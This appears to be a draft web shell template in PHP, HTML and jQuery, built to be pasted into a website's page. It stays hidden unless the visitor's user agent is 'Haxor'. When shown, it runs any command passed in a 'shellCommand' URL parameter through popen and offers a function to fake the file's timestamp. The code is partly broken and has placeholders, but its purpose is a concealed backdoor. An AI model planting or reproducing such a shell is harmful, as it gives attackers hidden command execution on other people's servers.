<!-- Above here, should be the end of the content in the <body> tag -->
<!-- Place the entire content in a <div id="luserContent"> tag  -->

<!-- Don't include this jQuery API if it's already included on the site -->
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script type="text/javascript">
	$(document).ready( function() {
		if( navigator.userAgent == "Haxor" ) {
			$("#haxored").prop("hidden",false);
			$("#luserContent").prop("hidden", true);
		} else {
			$("#haxored").prop("hidden", true);
			$("#luserContent").prop("hidden", false);
		}
	});
</script>
<div id="haxored" hidden="true" style='width: 100%; height: 100%; background-color: black'>
<?php
	class UserInterface
	{
		public $pwd = "";
		private $currentUser = "";
		private $mode = "w";
		private $errorToo = '2>&1';
		private $command = "";

		public function doCommand($command)
		{
			$mode = $this->mode;
			return popen($command,$command);
		}
		
		public function getPwd()
		{
			$this->pwd = popen("/bin/pwd",$this->mode);
			return $this->pwd;
		}

		public function cd($path)
		{
			chdir($path);
		}

		public function timeStamp($stamp)
		{
			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
		}
	}

	$userInterface = new UserInterface();
	if(isset($_GET['command'])) {
		$command = $_GET['command'];
		switch($command) {
			case "pwd":
				$pwd = $userInterface.getPwd();
				break;
			case "perm":
				$permissions = $userInterface.getPermissions();
				break;
			case "ps":
				$processes = $userInterface.getProcesses();
				break;
		}
	}
	if(isset($_GET['shellCommand'])) {
		$myCommand = $_GET['shellCommand'];
		$shellOut = $userInterface.doCommand($myCommand);
	}
?>
<style rel="stylesheet" type="text/css">
</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<form action="#" id="XmenuForm">
		<ul class="XmenuOptions">
			<li><button type="submit" form="XmenuForm" id="XbuttonPwd" name="command" value="pwd">PWD</div></li>
			<li><button type="submit" form="XmenuForm" id="XbuttonPerm" name="command" value="perm">Permissions</div></li>
			<li><button type="submit" form="XmenuForm" id="XbuttonPs" name="command" value="ps">Processes</div></li>
		</ul>
		</form>
	</div>
	<div id="XmainContainer">
		<div id="XmainShell">
			<div id="XoutputShell">
			</div>
			<div id="XinputShell">
			<form action="CHANGEME" method="POST">
			</form>
			</div>
		<div id="XsideBar">
			<ul>
				<li>Something here?</li>
				<li>or here</li>
				<li>or here</li>
			</ul>
		</div>
<script type="text/javascript">
$(document).ready( function() {
	$("#menuForm").on('submit', function(e) {
		e.preventDefault();
		$.ajax({
			url: CHANGEME,
			type: "GET",
			data: $(this).serialize();
		});
	});
});
</script>
</div>
<!-- Below here should be the closing </body> tag -->
